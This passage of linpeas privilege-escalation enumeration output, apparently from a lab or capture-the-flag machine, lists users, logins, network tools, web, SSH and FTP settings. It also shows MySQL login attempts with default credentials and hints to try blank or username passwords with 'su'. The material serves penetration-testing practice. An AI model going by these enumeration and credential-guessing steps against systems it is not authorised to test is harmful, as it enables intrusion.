/etc/sudoers.d</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Checking <span class="built_in">sudo</span> tokens</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                        </span><br><span class="line">ptrace protection is disabled (0), so <span class="built_in">sudo</span> tokens could be abused                                                             </span><br><span class="line"></span><br><span class="line">╔══════════╣ Checking Pkexec policy</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                    </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Superusers</span><br><span class="line">root:x:0:0:root:/root:/bin/bash                                                                                               </span><br><span class="line"></span><br><span class="line">╔══════════╣ Users with console</span><br><span class="line">grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">╔══════════╣ All <span class="built_in">users</span> &amp; <span class="built_in">groups</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)                                                                                        </span><br><span class="line">uid=1(daemon[0m) gid=1(daemon[0m) <span class="built_in">groups</span>=1(daemon[0m)</span><br><span class="line">uid=10(uucp) gid=10(uucp) <span class="built_in">groups</span>=10(uucp)</span><br><span class="line">uid=100(_apt) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=1000(grimmie) gid=1000(administrator) <span class="built_in">groups</span>=1000(administrator),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)                                                                                                               </span><br><span class="line">uid=101(systemd-timesync) gid=102(systemd-timesync) <span class="built_in">groups</span>=102(systemd-timesync)</span><br><span class="line">uid=102(systemd-network) gid=103(systemd-network) <span class="built_in">groups</span>=103(systemd-network)</span><br><span class="line">uid=103(systemd-resolve) gid=104(systemd-resolve) <span class="built_in">groups</span>=104(systemd-resolve)</span><br><span class="line">uid=104(messagebus) gid=110(messagebus) <span class="built_in">groups</span>=110(messagebus)</span><br><span class="line">uid=105(sshd) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=106(mysql) gid=113(mysql) <span class="built_in">groups</span>=113(mysql)</span><br><span class="line">uid=107(ftp) gid=114(ftp) <span class="built_in">groups</span>=114(ftp)</span><br><span class="line">uid=13(proxy) gid=13(proxy) <span class="built_in">groups</span>=13(proxy)</span><br><span class="line">uid=2(bin) gid=2(bin) <span class="built_in">groups</span>=2(bin)</span><br><span class="line">uid=3(sys) gid=3(sys) <span class="built_in">groups</span>=3(sys)</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">uid=34(backup) gid=34(backup) <span class="built_in">groups</span>=34(backup)</span><br><span class="line">uid=38(list) gid=38(list) <span class="built_in">groups</span>=38(list)</span><br><span class="line">uid=39(irc) gid=39(irc) <span class="built_in">groups</span>=39(irc)</span><br><span class="line">uid=4(<span class="built_in">sync</span>) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=41(gnats) gid=41(gnats) <span class="built_in">groups</span>=41(gnats)</span><br><span class="line">uid=5(games) gid=60(games) <span class="built_in">groups</span>=60(games)</span><br><span class="line">uid=6(man) gid=12(man) <span class="built_in">groups</span>=12(man)</span><br><span class="line">uid=65534(nobody) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=7(lp) gid=7(lp) <span class="built_in">groups</span>=7(lp)</span><br><span class="line">uid=8(mail) gid=8(mail) <span class="built_in">groups</span>=8(mail)</span><br><span class="line">uid=9(news) gid=9(news) <span class="built_in">groups</span>=9(news)</span><br><span class="line">uid=999(systemd-coredump) gid=999(systemd-coredump) <span class="built_in">groups</span>=999(systemd-coredump)</span><br><span class="line"></span><br><span class="line">╔══════════╣ Login now</span><br><span class="line"> 14:16:26 up  3:01,  1 user,  load average: 0.30, 0.07, 0.02                                                                  </span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:55m  0.02s  0.01s -bash</span><br><span class="line"></span><br><span class="line">╔══════════╣ Last logons</span><br><span class="line">root     tty1         Sat May 29 13:31:08 2021 - down                      (00:12)     0.0.0.0                                </span><br><span class="line">reboot   system boot  Sat May 29 13:30:20 2021 - Sat May 29 13:43:39 2021  (00:13)     0.0.0.0</span><br><span class="line">root     pts/0        Sat May 29 13:16:54 2021 - Sat May 29 13:27:56 2021  (00:11)     192.168.10.31</span><br><span class="line">root     tty1         Sat May 29 13:16:34 2021 - down                      (00:11)     0.0.0.0</span><br><span class="line">reboot   system boot  Sat May 29 13:15:21 2021 - Sat May 29 13:27:58 2021  (00:12)     0.0.0.0</span><br><span class="line">root     pts/0        Sat May 29 13:08:39 2021 - Sat May 29 13:14:47 2021  (00:06)     192.168.10.31</span><br><span class="line">administrator tty1         Sat May 29 13:06:40 2021 - down                      (00:08)     0.0.0.0</span><br><span class="line">reboot   system boot  Sat May 29 13:05:58 2021 - Sat May 29 13:14:49 2021  (00:08)     0.0.0.0</span><br><span class="line"></span><br><span class="line">wtmp begins Sat May 29 13:05:58 2021</span><br><span class="line"></span><br><span class="line">╔══════════╣ Last <span class="keyword">time</span> logon each user</span><br><span class="line">Username         Port     From             Latest                                                                             </span><br><span class="line">root             tty1                      Thu Feb 15 11:16:30 -0500 2024</span><br><span class="line">grimmie          pts/1    192.168.10.31    Sun May 30 03:21:39 -0400 2021</span><br><span class="line"></span><br><span class="line">╔══════════╣ Do not forget to <span class="built_in">test</span> <span class="string">&#x27;su&#x27;</span> as any other user with shell: without password and with their names as password (I don<span class="string">&#x27;t do it in FAST mode...)                                                                                                     </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Do not forget to execute &#x27;</span><span class="built_in">sudo</span> -l<span class="string">&#x27; without password or with valid password (if you know it)!!</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                             ╔══════════════════════╗</span></span><br><span class="line"><span class="string">═════════════════════════════╣ Software Information ╠═════════════════════════════                                            </span></span><br><span class="line"><span class="string">                             ╚══════════════════════╝                                                                         </span></span><br><span class="line"><span class="string">╔══════════╣ Useful software</span></span><br><span class="line"><span class="string">/usr/bin/base64                                                                                                               </span></span><br><span class="line"><span class="string">/usr/bin/nc</span></span><br><span class="line"><span class="string">/usr/bin/nc.traditional</span></span><br><span class="line"><span class="string">/usr/bin/netcat</span></span><br><span class="line"><span class="string">/usr/bin/perl</span></span><br><span class="line"><span class="string">/usr/bin/php</span></span><br><span class="line"><span class="string">/usr/bin/ping</span></span><br><span class="line"><span class="string">/usr/bin/python</span></span><br><span class="line"><span class="string">/usr/bin/python2</span></span><br><span class="line"><span class="string">/usr/bin/python2.7</span></span><br><span class="line"><span class="string">/usr/bin/python3</span></span><br><span class="line"><span class="string">/usr/bin/python3.7</span></span><br><span class="line"><span class="string">/usr/bin/socat</span></span><br><span class="line"><span class="string">/usr/bin/wget</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Installed Compilers</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ MySQL version</span></span><br><span class="line"><span class="string">mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">═╣ MySQL connection using default root/root ........... No</span></span><br><span class="line"><span class="string">═╣ MySQL connection using root/toor ................... No                                                                    </span></span><br><span class="line"><span class="string">═╣ MySQL connection using root/NOPASS ................. No                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching mysql credentials and exec</span></span><br><span class="line"><span class="string">From &#x27;</span>/etc/mysql/mariadb.conf.d/50-server.cnf<span class="string">&#x27; Mysql user: user                    = mysql                                    </span></span><br><span class="line"><span class="string">Found readable /etc/mysql/my.cnf</span></span><br><span class="line"><span class="string">[client-server]</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/conf.d/</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/mariadb.conf.d/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing MariaDB Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 869 Oct 12  2020 /etc/mysql/mariadb.cnf                                                                </span></span><br><span class="line"><span class="string">[client-server]</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/conf.d/</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/mariadb.conf.d/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw------- 1 root root 277 May 29  2021 /etc/mysql/debian.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Apache-Nginx Files (limit 70)</span></span><br><span class="line"><span class="string">Apache version: Server version: Apache/2.4.38 (Debian)                                                                        </span></span><br><span class="line"><span class="string">Server built:   2020-08-25T20:08:29</span></span><br><span class="line"><span class="string">httpd Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">Nginx version: nginx Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf-&lt;FilesMatch &quot;.+\.ph(ar|p|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf-&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php-source</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf-&lt;FilesMatch &quot;.+\.ph(ar|p|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf-&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php-source</span></span><br><span class="line"><span class="string">══╣ PHP exec extensions</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled                                                           </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 35 May 29  2021 /etc/apache2/sites-enabled/000-default.conf -&gt; ../sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 1332 Aug  8  2020 /etc/apache2/sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 35 May 29  2021 /etc/apache2/sites-enabled/000-default.conf -&gt; ../sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 71958 Feb 13  2021 /etc/php/7.3/apache2/php.ini</span></span><br><span class="line"><span class="string">allow_url_fopen = On</span></span><br><span class="line"><span class="string">allow_url_include = Off</span></span><br><span class="line"><span class="string">odbc.allow_persistent = On</span></span><br><span class="line"><span class="string">ibase.allow_persistent = 1</span></span><br><span class="line"><span class="string">mysqli.allow_persistent = On</span></span><br><span class="line"><span class="string">pgsql.allow_persistent = On</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 71570 Feb 13  2021 /etc/php/7.3/cli/php.ini</span></span><br><span class="line"><span class="string">allow_url_fopen = On</span></span><br><span class="line"><span class="string">allow_url_include = Off</span></span><br><span class="line"><span class="string">odbc.allow_persistent = On</span></span><br><span class="line"><span class="string">ibase.allow_persistent = 1</span></span><br><span class="line"><span class="string">mysqli.allow_persistent = On</span></span><br><span class="line"><span class="string">pgsql.allow_persistent = On</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Rsync Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 1044 Mar 15  2019 /usr/share/doc/rsync/examples/rsyncd.conf                                            </span></span><br><span class="line"><span class="string">[ftp]</span></span><br><span class="line"><span class="string">        comment = public archive</span></span><br><span class="line"><span class="string">        path = /var/www/pub</span></span><br><span class="line"><span class="string">        use chroot = yes</span></span><br><span class="line"><span class="string">        lock file = /var/lock/rsyncd</span></span><br><span class="line"><span class="string">        read only = yes</span></span><br><span class="line"><span class="string">        list = yes</span></span><br><span class="line"><span class="string">        uid = nobody</span></span><br><span class="line"><span class="string">        gid = nogroup</span></span><br><span class="line"><span class="string">        strict modes = yes</span></span><br><span class="line"><span class="string">        ignore errors = no</span></span><br><span class="line"><span class="string">        ignore nonreadable = yes</span></span><br><span class="line"><span class="string">        transfer logging = no</span></span><br><span class="line"><span class="string">        timeout = 600</span></span><br><span class="line"><span class="string">        refuse options = checksum dry-run</span></span><br><span class="line"><span class="string">        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Ldap Files (limit 70)</span></span><br><span class="line"><span class="string">The password hash is from the &#123;SSHA&#125; to &#x27;</span>structural<span class="string">&#x27;                                                                          </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/ldap</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching ssl/ssh files</span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing SSH Files (limit 70)                                                                                   </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 174 May 29  2021 /etc/ssh/ssh_host_ecdsa_key.pub</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 94 May 29  2021 /etc/ssh/ssh_host_ed25519_key.pub</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 394 May 29  2021 /etc/ssh/ssh_host_rsa_key.pub</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PermitRootLogin yes</span></span><br><span class="line"><span class="string">ChallengeResponseAuthentication no</span></span><br><span class="line"><span class="string">UsePAM yes</span></span><br><span class="line"><span class="string">══╣ Some certificates were found (out limited):</span></span><br><span class="line"><span class="string">/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                  </span></span><br><span class="line"><span class="string">/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Actalis_Authentication_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Commercial.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Networking.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Premium.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Premium_ECC.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_1.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_2.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_3.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_4.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Atos_TrustedRoot_2011.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Baltimore_CyberTrust_Root.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Buypass_Class_2_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Buypass_Class_3_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/CA_Disig_Root_R2.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/CFCA_EV_ROOT.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/COMODO_Certification_Authority.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem</span></span><br><span class="line"><span class="string">2431PSTORAGE_CERTSBIN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ Some home ssh config file was found</span></span><br><span class="line"><span class="string">/usr/share/openssh/sshd_config                                                                                                </span></span><br><span class="line"><span class="string">ChallengeResponseAuthentication no</span></span><br><span class="line"><span class="string">UsePAM yes</span></span><br><span class="line"><span class="string">X11Forwarding yes</span></span><br><span class="line"><span class="string">PrintMotd no</span></span><br><span class="line"><span class="string">AcceptEnv LANG LC_*</span></span><br><span class="line"><span class="string">Subsystem       sftp    /usr/lib/openssh/sftp-server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ /etc/hosts.allow file found, trying to read the rules:</span></span><br><span class="line"><span class="string">/etc/hosts.allow                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Searching inside /etc/ssh/ssh_config for interesting info</span></span><br><span class="line"><span class="string">Host *</span></span><br><span class="line"><span class="string">    SendEnv LANG LC_*</span></span><br><span class="line"><span class="string">    HashKnownHosts yes</span></span><br><span class="line"><span class="string">    GSSAPIAuthentication yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing PAM Auth Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/pam.d                                                                           </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2133 Jan 31  2020 /etc/pam.d/sshd</span></span><br><span class="line"><span class="string">account    required     pam_nologin.so</span></span><br><span class="line"><span class="string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close</span></span><br><span class="line"><span class="string">session    required     pam_loginuid.so</span></span><br><span class="line"><span class="string">session    optional     pam_keyinit.so force revoke</span></span><br><span class="line"><span class="string">session    optional     pam_motd.so  motd=/run/motd.dynamic</span></span><br><span class="line"><span class="string">session    optional     pam_motd.so noupdate</span></span><br><span class="line"><span class="string">session    optional     pam_mail.so standard noenv # [1]</span></span><br><span class="line"><span class="string">session    required     pam_limits.so</span></span><br><span class="line"><span class="string">session    required     pam_env.so # [1]</span></span><br><span class="line"><span class="string">session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale</span></span><br><span class="line"><span class="string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Keyring Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /usr/share/keyrings                                                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching uncommon passwd files (splunk)</span></span><br><span class="line"><span class="string">passwd file: /etc/pam.d/passwd                                                                                                </span></span><br><span class="line"><span class="string">passwd file: /etc/passwd</span></span><br><span class="line"><span class="string">passwd file: /usr/share/bash-completion/completions/passwd</span></span><br><span class="line"><span class="string">passwd file: /usr/share/lintian/overrides/passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Github Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.github                                </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/phpmyadmin/motranslator/.github</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/tecnickcom/tcpdf/.github</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing PGP-GPG Files (limit 70)</span></span><br><span class="line"><span class="string">gpg Not Found                                                                                                                 </span></span><br><span class="line"><span class="string">netpgpkeys Not Found                                                                                                          </span></span><br><span class="line"><span class="string">netpgp Not Found                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8700 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8709 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2453 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8132 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8141 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2332 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7443 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7452 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2263 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8700 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8709 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2453 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8132 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8141 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2332 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 55625 Mar 16  2021 /usr/share/keyrings/debian-archive-keyring.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 36873 Mar 16  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7443 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7452 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2263 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Postfix Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 675 Mar  1  2019 /usr/share/bash-completion/completions/postfix                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing FTP Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 5851 May 29  2021 /etc/vsftpd.conf                                                                     </span></span><br><span class="line"><span class="string">anonymous_enable=YES</span></span><br><span class="line"><span class="string">local_enable=YES</span></span><br><span class="line"><span class="string">#write_enable=YES</span></span><br><span class="line"><span class="string">#anon_upload_enable=YES</span></span><br><span class="line"><span class="string">#anon_mkdir_write_enable=YES</span></span><br><span class="line"><span class="string">#chown_uploads=YES</span></span><br><span class="line"><span class="string">#chown_username=whoever</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 506 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 564 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 260 Feb  1  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable=YES</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span 